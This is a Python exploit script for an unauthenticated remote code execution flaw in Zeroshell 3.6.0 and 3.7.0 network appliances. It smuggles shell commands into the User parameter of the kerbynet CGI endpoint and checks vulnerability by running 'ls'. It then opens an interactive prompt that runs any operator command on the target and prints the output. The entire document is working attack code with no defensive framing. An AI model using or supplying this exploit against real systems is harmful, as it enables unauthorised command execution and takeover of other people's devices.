#!/usr/bin/env python
import requests,certifi,urllib3

def banner():
	print (''' 
########################################################################################
# Exploit Title: Zeroshell - Net Services Unauthenticated Remote Code Execution | RCE
# Discovered Date: 13.01.2017
# Discovered by: Ozer Goker
# Exploit by: Bhashit Pandya - 19.01.2018
# Vendor Homepage: http://www.zeroshell.org
# Software Link: www.zeroshell.org/download/
# Version: 3.6.0 & 3.7.0 
########################################################################################''')

def exploit(host):
	print("[!]^C to EXIT")
	try:
		while True:
			cmd = input(">")
			target = host+'/cgi-bin/kerbynet?Action=StartSessionSubmit&User=\'%26'+cmd+'%26\'&PW=#'
			#print(host)
			req = requests.get(target, verify=False)
			rep = req.text
			rep = rep.split("</html>",4)[1]
			print(rep)
	except KeyboardInterrupt:
		print("\n[!]quiting..")


def check(host):
	print("[+]Connection Established!")
	host += '/cgi-bin/kerbynet?Action=StartSessionSubmit&User=\'%26ls%26\'&PW=#'
	req = requests.get(host, verify=False)
	rep = req.text
	rep = rep.split("</html>",1)[1]
	rep = rep.strip()
	if rep == "":
		print("[+]It is not vulnerable!!")
	else:
		print("[+]It is vulnerable!! :D")
		c = input("[!]Send commands?[y/n]:")
		if c == "y":
			return True
		else:
			exit()


def session(host):
	print("[+]Prepairing Session..")
	try:
		req = requests.get(host, verify=False)
		if (req.status_code == 200):
			return True
		else:
			print("[-]Doesn't seems to be zeroshell!!")
			exit()
	except:
		#print("Something wrong!!")
		#exit()
		print("")

if __name__ == "__main__":
	urllib3.disable_warnings()
	banner()
	host = input("Enter the host:")
	#host += '/cgi-bin/kerbynet?Action=StartSessionSubmit&User=\'%26whoami%26\'&PW=#'
	#host = "https://192.168.0.10"
	s = session(host)
	if s == True:
		c = check(host)
	if c == True:
		exploit(host)
